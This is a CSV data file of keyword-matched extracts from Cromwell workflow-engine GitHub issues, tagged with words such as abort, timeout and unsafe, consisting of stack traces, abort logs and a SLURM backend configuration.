Safety,"swagger, the abort takes a long time and then gives an error: ; Response Code 500; ""status"": ""error"",; ""message"": ""The server was not able to produce a timely response to your request."". The workflow is removed from WORKFLOW_STORE_ENTRY but the associated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1124,Abort,Aborting,1124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,swap running jobs to aborting in the workflow store if abort-on-termi…,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2819:21,abort,aborting,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2819,2,['abort'],"['abort-on-termi', 'aborting']"
Safety,t #1. Retrying after 596 milliseconds; org.http4s.client.ConnectionFailure: Error connecting to https://quay.io using address quay.io:443 (unresolved: false); at org.http4s.client.blaze.Http1Support.$anonfun$buildPipeline$1(Http1Support.scala:90); at scala.concurrent.impl.Promise$Transformation.run(Promise.scala:477); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628); at java.base/java.lang.Thread.run(Thread.java:834); at async @ org.http4s.internal.package$.$anonfun$fromFuture$1(package.scala:144); at flatMap @ org.http4s.internal.package$.fromFuture(package.scala:139); at flatMap @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at shift @ org.http4s.client.PoolManager.$anonfun$createConnection$2(PoolManager.scala:119); at uncancelable @ org.http4s.client.ConnectionManager$.pool(ConnectionManager.scala:83); at unsafeRunSync @ cromwell.docker.DockerInfoActor.preStart(DockerInfoActor.scala:172); Caused by: java.net.SocketTimeoutException: An attempt to establish connection with quay.io/50.17.122.58:443 timed out after 10 seconds.; at org.http4s.blaze.channel.nio2.ClientChannelFactory$$anon$1.run(ClientChannelFactory.scala:66); at org.http4s.blaze.util.Execution$$anon$3.execute(Execution.scala:80); at org.http4s.blaze.util.TickWheelExecutor$Node.run(TickWheelExecutor.scala:271); at org.http4s.blaze.util.TickWheelExecutor$Bucket.checkNext$1(TickWheelExecutor.scala:207); at org.http4s.blaze.util.TickWheelExecutor$Bucket.prune(TickWheelExecutor.scala:213); at org.http4s.blaze.util.TickWheelExecutor.go$3(TickWheelExecutor.scala:168); at org.http4s.blaze.util.TickWheelExecutor.org$http4s$blaze$util$TickWheelExecutor$$cycle(TickWheelExecutor.scala:171); at org.http4s.blaze.util.TickWheelExecutor$$anon$1.run(TickWheelExecutor.scala:68). To confirm https (port 443) access to the quay.io/50.17.122.58 in this ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7136:1508,unsafe,unsafeRunSync,1508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7136,1,['unsafe'],['unsafeRunSync']
Safety,t cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43) ; at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.IOBracket$BracketStart.apply(IOBracket.scala:60); at cats.effect.internals.IOBracket$BracketStart.apply(IOBracket.scala:41); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:134); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); at cats.effect.internals.IOBracket$.$anonfun$apply$1(IOBracket.scala:36); at cats.effect.internals.IOBracket$.$anonfun$apply$1$adapted(IOBracket.scala:33); at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:328); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:117); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); at cats.effect.IO.unsafeRunAsync(IO.scala:258); at cats.effect.IO.unsafeToFuture(IO.scala:345); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeAsync(AwsBatchAsyncBackendJobExecutionActor.scala:342); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:943); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); at cromwell.backen,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303:6004,unsafe,unsafeToFuture,6004,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303,1,['unsafe'],['unsafeToFuture']
Safety,"t copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1628,timeout,timeout,1628,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['timeout'],['timeout']
Safety,"t has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; --time=${time} \; -D $phoenix_home_cwd \; -o $phoenix_home_out \; -e $phoenix_home_err \; $phoenix_script; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". root = ""/fast/gdr/uat/cromwell-executions""; }; }. } # providers. } # backend. # https://gatkforums.broadinstitute.org/wdl/discussion/9536/how-do-i-set-up-a-mysql-database-for-cromwell; # http://slick.lightbend.com/doc/3.2.0/api/index.html#slick.jdbc.JdbcBackend$DatabaseFactoryDef@forConfig(Str",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:1999,timeout,timeout-seconds,1999,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['timeout'],['timeout-seconds']
Safety,"t or no pull access\n""); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:79); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:551); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:558); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1072); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1068); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.fo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861:1855,recover,recoverWith,1855,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861,1,['recover'],['recoverWith']
Safety,"t$InsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:502); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$MultiInsertAction.run(JdbcActionComponent.scala:527). 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.dbio.DBIOAction$$anon$4.$anonfun$run$3(DBIOAction.scala:240); 	at slick.dbio.DBIOAction$$anon$4$$Lambda$1952/113291290.apply(Unknown Source); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); [2018-03-09 15:38:57,90] [warn] Couldn't find a suitable DSN, defaulting to a Noop one.; [2018-03-09 15:42:11,14] [info] Using noop to send events.; [2018-03-09 15:49:48,68] [warn] Localhost hostname lookup failed, keeping the value 'unavailable'; java.util.concurrent.TimeoutException: null; 	at java.util.concurrent.FutureTask.get(FutureTask.java:205); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.updateCache(EventBuilder.java:491); 	at com.getsentry.raven.event.EventBuilder$HostnameCache.getHostname(EventBuilder.java:477); 	at com.getsentry.raven.event.EventBuilder.autoSetMissingValues(EventBuilder.java:97); 	at com.getsentry.raven.event.EventBuilder.build(EventBuilder.java:410); 	at com.getsentry.raven.logback.SentryAppender.buildEvent(SentryAppender.java:324); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:230); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:37); 	at ch.qos.logback.core.AppenderBase.doAppend(AppenderBase.java:82); 	at ch.qos.logback.core.spi.AppenderAttachableImpl.appendLoopOnAppenders(AppenderAttachableImpl.java:51); 	at ch.qos.logback.classic.Logger.appendLoopOnAppenders(Logger.java:270); 	at ch.qos.logback.classic.Logger.callAppenders(Logger.java:257); 	at ch.qos.logback.classic.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387:8898,Timeout,TimeoutException,8898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387,1,['Timeout'],['TimeoutException']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:19,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:20,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:21,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:22,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:23,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:24,84] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:7490,abort,abort,7490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.Abstrac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9591,abort,abort,9591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.jso",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:11830,abort,abort,11830,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:42,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:43,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:44,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:45,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:46,38] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:14345,abort,abort,14345,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.j",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16377,abort,abort,16377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:18894,abort,abort,18894,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
